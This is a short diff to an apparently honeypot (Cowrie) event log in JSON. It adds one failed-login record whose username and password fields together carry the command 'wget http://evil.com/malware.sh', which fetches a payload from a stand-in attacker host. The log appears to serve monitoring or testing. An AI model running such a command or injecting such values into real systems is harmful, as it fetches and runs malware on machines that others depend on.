@@ -322,6 +322,18 @@
         "source": "manual_submission"
       },
       "submitted_at": "2026-03-29T12:03:09.471141"
+    },
+    {
+      "log": {
+        "eventid": "cowrie.login.failed",
+        "src_ip": "198.51.100.5",
+        "username": "\"wget",
+        "password": "http://evil.com/malware.sh\"",
+        "timestamp": "2026-03-29T12:03:11.567541",
+        "submitted_at": "2026-03-29T12:03:11.567560",
+        "source": "manual_submission"
+      },
+      "submitted_at": "2026-03-29T12:03:11.567560"
     }
   ]
 }
